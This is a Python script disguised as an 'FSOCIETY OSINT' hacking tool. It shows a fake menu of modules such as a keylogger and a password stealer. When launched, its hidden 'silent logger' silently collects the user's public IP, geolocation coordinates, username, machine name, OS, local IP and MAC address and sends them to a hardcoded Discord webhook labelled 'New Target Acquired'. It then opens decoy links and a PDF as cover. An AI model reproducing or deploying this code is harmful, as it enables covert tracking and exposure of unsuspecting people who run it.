import requests
import platform
import socket
import uuid
import datetime
import os
import getpass
import subprocess
import time
import webbrowser

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513931403186802868/WKZhIgzyLxqXK19Qk-CxxSi3oZnWMg1wftKHyqeEPLu3x5MXlapMkWVQ6DwV7ZkEt0Bz"

# ================== SILENT LOGGER ==================
def get_public_ip():
    try:
        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip")
    except:
        try:
            return requests.get("https://api64.ipify.org?format=json", timeout=5).json().get("ip")
        except:
            return "N/A"

def get_ip_info():
    ip = get_public_ip()
    services = [
        f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse",
        "https://ipinfo.io/json",
        "https://ipapi.co/json/",
        "https://freeipapi.com/api/json/"
    ]
    
    for url in services:
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            r = requests.get(url, headers=headers, timeout=7)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") != "fail" and (data.get("lat") or data.get("latitude")):
                    return data
        except:
            continue
    return {"ip": ip}

def get_system_info():
    info = {
        "Username": getpass.getuser(),
        "Computer Name": platform.node(),
        "OS": f"{platform.system()} {platform.release()} ({platform.version()})",
        "Architecture": platform.machine(),
        "Public IP": get_public_ip(),
        "Local IP": socket.gethostbyname(socket.gethostname()),
        "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1]),
        "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    return info

def send_to_webhook(ip_data):
    sys_info = get_system_info()
    lat = ip_data.get("lat") or ip_data.get("latitude") or "N/A"
    lon = ip_data.get("lon") or ip_data.get("longitude") or "N/A"
    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != "N/A" else "N/A"
    
    embed = {
        "title": "🎯 New Target Acquired",
        "color": 0x00ff00,
        "fields": [
            {"name": "IP", "value": ip_data.get("query") or ip_data.get("ip") or sys_info["Public IP"], "inline": True},
            {"name": "City", "value": ip_data.get("city") or "N/A", "inline": True},
            {"name": "Region", "value": ip_data.get("regionName") or ip_data.get("region", "N/A"), "inline": True},
            {"name": "Country", "value": f"{ip_data.get('country')} ({ip_data.get('countryCode') or 'N/A'})", "inline": True},
            {"name": "ZIP", "value": ip_data.get("zip") or ip_data.get("postal", "N/A"), "inline": True},
            {"name": "Coordinates", "value": f"{lat}, {lon}", "inline": True},
            {"name": "Google Maps", "value": f"[VIEW ON MAP]({maps_link})", "inline": False},
            {"name": "ISP", "value": ip_data.get("isp") or ip_data.get("org", "N/A"), "inline": False},
        ],
        "footer": {"text": "FSOCIETY OSINT TOOL v4.20"},
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    
    for key, value in sys_info.items():
        embed["fields"].append({"name": key, "value": str(value), "inline": True})
    
    try:
        requests.post(WEBHOOK_URL, json={"username": "fsociety", "embeds": [embed]}, timeout=5)
    except:
        pass

# ================== FAKE OSINT PANEL ==================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = r"""
 /$$$$$$$$ /$$ /$$
| $$_____/ |__/ | $$
| $$ /$$$$$$$ /$$$$$$ /$$$$$$$ /$$ /$$$$$$ /$$$$$$ /$$ /$$
| $$$$$ /$$_____/ /$$__ $$ /$$_____/| $$ /$$__ $$|_ $$_/ | $$ | $$
| $$__/| $$$$$$ | $$ \ $$| $$ | $$| $$$$$$$$ | $$ | $$ | $$
| $$ \____ $$| $$ | $$| $$ | $$| $$_____/ | $$ /$$| $$ | $$
| $$ /$$$$$$$/| $$$$$$/| $$$$$$$| $$| $$$$$$$ | $$$$/| $$$$$$$
|__/ |_______/ \______/ \_______/|__/ \_______/ \___/ \____ $$
                                                              /$$ | $$
                                                             | $$$$$$/
                                                              \______/
   
                  FSOCIETY OSINT FRAMEWORK v4.20 - ALL RIGHTS RESERVED
                  [ CONNECTED TO PROXY CHAIN • TOR ENABLED ]
    """
    print(banner)

def fake_menu():
    clear()
    print_banner()
    print(" " * 10 + "="*80)
    print(" " * 15 + "AVAILABLE MODULES")
    print(" " * 10 + "="*80)
    
    print(" [01] Target Reconnaissance               [10] Browser History Dump")
    print(" [02] IP Geolocation & Street Pull        [11] Passwords & Keychain")
    print(" [03] Social Media Footprint              [12] Webcam Snapshot")
    print(" [04] WiFi Networks + Passwords           [13] Clipboard Stealer")
    print(" [05] Full System Information             [14] Keylogger (Live)")
    print(" [06] Phone Number OSINT                  [15] Discord Token Grabber")
    print(" [07] Email Address Tracer                [16] Installed Software List")
    print(" [08] Bitcoin Wallet Scanner              [17] Screenshot Capture")
    print(" [09] Dark Web Mention Search             [18] Exit Framework")
   
    print("\n Enter option (1-18): ", end="")

def troll_execute(choice):
    print(f"\n[+] Executing Module {choice}...")
    time.sleep(1.2)
    print("[+] Access granted. Routing through TOR...")
    time.sleep(0.8)
    print("[+] Module executed successfully.")
    time.sleep(0.7)
    print("[+] Data harvested. fsociety thanks you.")
    
    # === TROLL: Open YouTube fsociety video ===
    try:
        webbrowser.open("https://www.youtube.com/watch?v=4yKsIdr_PNU")  # F Society scene
    except:
        pass
    
    # === TROLL: Open fsociety logo from internet (no local file needed) ===
    try:
        webbrowser.open("https://i.imgur.com/2QJqZfJ.png")  # fsociety logo
    except:
        pass

if __name__ == "__main__":
    # Silent grab
    ip_data = get_ip_info()
    send_to_webhook(ip_data)
    
    time.sleep(0.8)
    fake_menu()
    
    choice = input().strip()
    
    if choice == "18" or choice.lower() == "exit":
        print("\n[+] Disconnecting from fsociety network...")
        time.sleep(1.5)
    else:
        troll_execute(choice)
    
    print("\n[+] Session terminated. Stay anonymous.")
    time.sleep(3)
    
    # Extra cover
    try:
        if os.name == 'nt':
            os.startfile("document.pdf")
        else:
            subprocess.call(["xdg-open", "document.pdf"])
    except:
        pass